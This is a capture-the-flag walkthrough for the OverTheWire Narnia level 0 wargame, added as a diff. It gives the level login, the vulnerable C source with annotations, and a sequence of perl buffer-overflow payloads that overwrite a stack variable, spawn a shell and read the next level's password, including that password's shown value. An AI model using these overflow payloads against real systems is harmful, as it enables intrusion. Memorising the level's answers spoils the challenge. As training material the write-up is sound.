@@ -1,0 +1,92 @@
+This is a solution guide to the Narnia0 Level
+
+ssh narnia0@narnia.labs.overthewire.org
+PW is narnia0
+
+Change directories to the narnia games folder
+-> cd /narnia
+
+Notice all the different files and find the level 0 binary.
+
+I start by checking what the file does
+-> ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: AAAA %p
+  buf: AAAA
+  val: 0x41414141
+  WAY OFF!!!!
+
+Well that's interesting that it did something weird with %p. Now let's check the source code.
+-> cat narnia0.c
+#include <stdio.h>
+#include <stdlib.h>
+
+  int main(){
+  	long val=0x41414141;
+  	char buf[20];   // notice the buffer here is 20, which means there may be a potential for a buffer overflow
+
+  	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+  	printf("Here is your chance: ");
+  	scanf("%24s",&buf);   //notice the buffer read in from the command prompt above is a 24 byte string
+  	                      //this means that we have a 4 byte overflow
+
+  	printf("buf: %s\n",buf);        //here it prints the 20 bytes from char buf
+  	printf("val: 0x%08x\n",val);    //the 4 bytes that overflow fall into val 
+  	                                //because it was initialized on the stack below it
+
+  	if(val==0xdeadbeef)             //a successful overflow input will give me a shell!
+  		system("/bin/sh");
+  	else {
+  		printf("WAY OFF!!!!\n");
+  		exit(1);
+  	}
+
+  	return 0;
+  }
+  
+Alright now that I know this let's try some crafted input.
+-> perl -e 'print "A"x20 . "BBBB"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
+  val: 0x42424242
+  WAY OFF!!!!
+
+Well that's great, we've just confirmed that we can affect what goes into long val. Now let's try it with deadbeef in there.
+-> perl -e 'print "A"x20 . "deadbeef"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAdead
+  val: 0x64616564
+  WAY OFF!!!!
+  
+Well that didn't work, because scanf is accepting string characters. So now we need a way to get the proper "characters"
+in so that it will display 0xdeadbeef. Remember that you also have to craft the input to be little endian (I think of this
+as the input has to be spelled backwards).
+-> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+  val: 0xdeadbeef
+  
+Well that's weird I didn't get a shell, but the WAY OFF!!!! didn't show. At this point I realized that the /bin/sh needed
+an input to follow the system command. So then I added more input onto the end.
+-> perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+  val: 0xdeadbeef
+
+Still no solution. Now I want to create a situation where the program does something unintentional.
+-> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"x1100 . "cat /etc/narnia0_pass/narnia1"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+  val: 0xdeadbeef
+  /bin/sh: 1: ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?
+  ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?cat: File name too long
+
+Well that was useful, now lets whittle it down so that the /bin/sh command takes the correct input.
+All I should have to do now is remove the extra bytes.
+-> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"x1019 . "cat /etc/narnia_pass/narnia1"' | ./narnia0
+  Correct val's value from 0x41414141 -> 0xdeadbeef!
+  Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+  val: 0xdeadbeef
+  efeidiedae
+  
+BINGO! We have a solution.
